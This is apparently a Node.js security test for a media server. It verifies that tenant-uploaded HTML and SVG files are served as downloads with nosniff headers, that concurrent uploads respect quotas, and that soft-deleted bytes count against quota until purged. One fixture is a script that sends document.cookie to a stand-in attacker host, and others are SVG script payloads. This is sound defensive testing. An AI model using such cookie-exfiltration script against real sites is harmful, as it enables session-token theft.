'use strict';
// Abuse cases for developer-project tenants (ADR-014), where the uploader is a third party:
//   1. /f/:key must not render uploaded HTML/SVG inline on the openvibe.media origin (whose
//      JS-readable ov_token cookie is the visitor's Network access token): nosniff, and
//      `attachment` for anything that is not an image (not SVG), video, audio, PDF or plain text.
//   2. Concurrent v1 file uploads must not all pass the quota check before any of them is stored.
//   3. Upload -> delete -> upload must not grow a project tenant's disk without bound: soft-deleted
//      bytes are kept for the retention period, so they count until purged.
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const crypto = require('crypto');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ov-media-tenantabuse-'));
const dir = (n) => { const d = path.join(tmp, n); fs.mkdirSync(d, { recursive: true }); return d; };
process.env.DB_PATH = path.join(tmp, 'media.db');
process.env.VOD_PATH = dir('vods');
process.env.FILES_PATH = dir('files');
process.env.OBJECTS_PATH = dir('objects');
process.env.THUMBNAILS_PATH = dir('thumbnails');
process.env.OV_NETWORK_URL = 'https://openvibe.network';
process.env.MEDIA_PUBLIC_URL = 'https://media.test';
process.env.MEDIA_SIGNING_SECRET = 'test-signing-secret';
process.env.MEDIA_APP_TENANT_QUOTA_MB = '2';
process.env.MEDIA_APP_SANDBOX_QUOTA_MB = '1';

const db = require('../server/db/database');
const auth = require('../server/auth');
const objectRoutes = require('../server/objects/routes');
const model = require('../server/objects/model');
const { serviceAuth, ids } = require('openvibe-contracts');
const express = require('express');

const keys = crypto.generateKeyPairSync('rsa', { modulusLength: 2048, publicKeyEncoding: { type: 'spki', format: 'pem' }, privateKeyEncoding: { type: 'pkcs8', format: 'pem' } });
auth._setNetworkPublicKeyForTests(keys.publicKey);

const PA = `prj_${ids.ulid()}`;
const PB = `prj_${ids.ulid()}`;
const APP_A = `app_${ids.ulid()}`;
const now = Math.floor(Date.now() / 1000);
const appTok = ({ project = PA, env = 'production' } = {}) => serviceAuth.signServiceToken({
    iss: 'https://openvibe.network', sub: `app:${APP_A}`, actor_type: 'app', aud: ['openvibe.media'], cap: ['media.object.upload', 'media.object.read'], ns: [project],
    project_id: project, env, iat: now, exp: now + 300, jti: `tok_${crypto.randomBytes(6).toString('hex')}`,
}, keys.privateKey);

const app = express();
app.put('/api/v2/:app/objects/:id/content', ...objectRoutes.contentHandlers);
app.use(express.json());
app.use('/api/v1/:app/files', require('../server/files/routes'));
app.use('/api/v2/:app/objects', objectRoutes);
app.use('/o', objectRoutes.publicRouter);
app.use('/', require('../server/public/routes'));
const server = http.createServer(app);

(async () => {
    await new Promise((r) => server.listen(0, '127.0.0.1', r));
    const base = `http://127.0.0.1:${server.address().port}`;
    const local = (u) => base + String(u).replace('https://media.test', '');
    const req = async (method, p, { bearer, json, form, raw, headers = {} } = {}) => {
        const h = { ...headers };
        if (bearer) h.authorization = `Bearer ${bearer}`;
        let body;
        if (json !== undefined) { h['content-type'] = 'application/json'; body = JSON.stringify(json); }
        if (form) body = form;
        if (raw !== undefined) body = raw;
        const r = await fetch(p.startsWith('http') ? p : base + p, { method, headers: h, body, redirect: 'manual' });
        const text = await r.text();
        let parsed = null;
        try { parsed = JSON.parse(text); } catch { /* bytes */ }
        return { status: r.status, body: parsed, text, headers: r.headers };
    };
    const upload = (project, bearer, content, name, type) => {
        const fd = new FormData();
        fd.append('file', new Blob([Buffer.from(content)], { type }), name);
        return req('POST', `/api/v1/${project}/files`, { bearer, form: fd });
    };

    // ── 1. Uploaded HTML / SVG never renders on the Media origin ──
    const html = '<script>fetch("https://evil.example/?t="+document.cookie)</script>';
    let r = await upload(PA, appTok(), html, 'evil.html', 'text/html');
    assert.strictEqual(r.status, 201, JSON.stringify(r.body));
    r = await req('GET', `/f/${encodeURIComponent(r.body.key)}`);
    assert.strictEqual(r.status, 200);
    assert.strictEqual(r.headers.get('x-content-type-options'), 'nosniff', '/f/ sends nosniff');
    assert.ok(/^attachment/.test(r.headers.get('content-disposition') || ''), `HTML is served as a download, got ${r.headers.get('content-disposition')}`);
    r = await req('GET', `/f/${encodeURIComponent((await upload(PA, appTok(), html, 'evil.html', 'text/html')).body.key)}`, { headers: { range: 'bytes=0-10' } });
    assert.strictEqual(r.status, 206);
    assert.ok(/^attachment/.test(r.headers.get('content-disposition') || ''), 'range responses too');
    assert.strictEqual(r.headers.get('x-content-type-options'), 'nosniff');

    r = await upload(PA, appTok(), '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'x.svg', 'image/svg+xml');
    assert.strictEqual(r.status, 201);
    r = await req('GET', `/f/${encodeURIComponent(r.body.key)}`);
    assert.ok(/^attachment/.test(r.headers.get('content-disposition') || ''), 'SVG is served as a download');

    // MIME types are case-insensitive: image/SVG+xml is still SVG. (FormData lowercases, so raw multipart.)
    const boundary = 'ovboundary';
    const multipart = Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="y.svg"\r\nContent-Type: image/SVG+xml\r\n\r\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>\r\n--${boundary}--\r\n`);
    r = await req('POST', `/api/v1/${PA}/files`, { bearer: appTok(), raw: multipart, headers: { 'content-type': `multipart/form-data; boundary=${boundary}` } });
    assert.strictEqual(r.status, 201, JSON.stringify(r.body));
    r = await req('GET', `/f/${encodeURIComponent(r.body.key)}`);
    assert.ok(/^attachment/.test(r.headers.get('content-disposition') || ''), `mixed-case SVG is a download, got ${r.headers.get('content-type')} ${r.headers.get('content-disposition')}`);

    // Sandbox signed URLs get the same treatment.
    r = await upload(PA, appTok({ env: 'sandbox' }), html, 'evil.html', 'text/html');
    assert.strictEqual(r.status, 201);
    r = await req('GET', local(r.body.url));
    assert.strictEqual(r.status, 200);
    assert.ok(/^attachment/.test(r.headers.get('content-disposition') || ''), 'sandbox HTML is a download too');

    // Pictures and plain text still display inline.
    const png = Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex');
    r = await upload(PA, appTok(), png, 'pic.png', 'image/png');
    r = await req('GET', `/f/${encodeURIComponent(r.body.key)}`);
    assert.strictEqual(r.headers.get('content-type'), 'image/png');
    assert.ok(/^inline/.test(r.headers.get('content-disposition') || ''), 'images stay inline');

    // ── 2. Concurrent v1 uploads cannot all slip under the quota ──
    const sbQuota = 1024 * 1024;
    db.run('DELETE FROM files WHERE app_id = ?', [`${PA}-sandbox`]);
    const chunk = 400 * 1024;
    const results = await Promise.all(Array.from({ length: 6 }, (_, i) => upload(PA, appTok({ env: 'sandbox' }), crypto.randomBytes(chunk), `c${i}.bin`, 'application/octet-stream')));
    const stored = results.filter(x => x.status === 201).length;
    assert.ok(stored <= 2, `at most 2 × 400 KB fit in 1 MB, ${stored} were stored`);
    assert.ok(model.usedBytes(`${PA}-sandbox`) <= sbQuota, 'sandbox usage stays within its quota');

    // ── 3. Upload → delete → upload cannot outgrow the quota while the bytes are retained ──
    const tok = appTok({ project: PB, env: 'sandbox' });
    const size = 700 * 1024;
    let refusedAt = null;
    for (let i = 0; i < 4 && refusedAt == null; i++) {
        r = await req('POST', `/api/v2/${PB}/objects`, { bearer: tok, json: { size_bytes: size, mime_type: 'application/octet-stream' } });
        if (r.status === 413) { refusedAt = i; break; }
        assert.strictEqual(r.status, 201, JSON.stringify(r.body));
        const id = r.body.id;
        r = await req('PUT', local(r.body.upload.url), { raw: crypto.randomBytes(size), headers: { 'content-type': 'application/octet-stream' } });
        assert.strictEqual(r.status, 200, JSON.stringify(r.body));
        r = await req('POST', `/api/v2/${PB}/objects/${id}/complete`, { bearer: tok, json: {} });
        assert.strictEqual(r.status, 200, JSON.stringify(r.body));
        r = await req('DELETE', `/api/v2/${PB}/objects/${id}`, { bearer: tok });
        assert.strictEqual(r.status, 200, JSON.stringify(r.body));
    }
    assert.strictEqual(refusedAt, 1, 'soft-deleted bytes still on disk count against a project tenant quota');
    // Once purged, the space is free again.
    db.run("UPDATE media_objects SET deleted_at = datetime('now', '-40 days') WHERE app_id = ?", [`${PB}-sandbox`]);
    model.purgeExpired({ retentionDays: 30 });
    r = await req('POST', `/api/v2/${PB}/objects`, { bearer: tok, json: { size_bytes: size } });
    assert.strictEqual(r.status, 201, 'purged bytes no longer count');

    server.close();
    fs.rmSync(tmp, { recursive: true, force: true });
    console.log('developer-project tenant abuse: all checks passed');
})().catch((err) => { console.error(err); process.exit(1); });
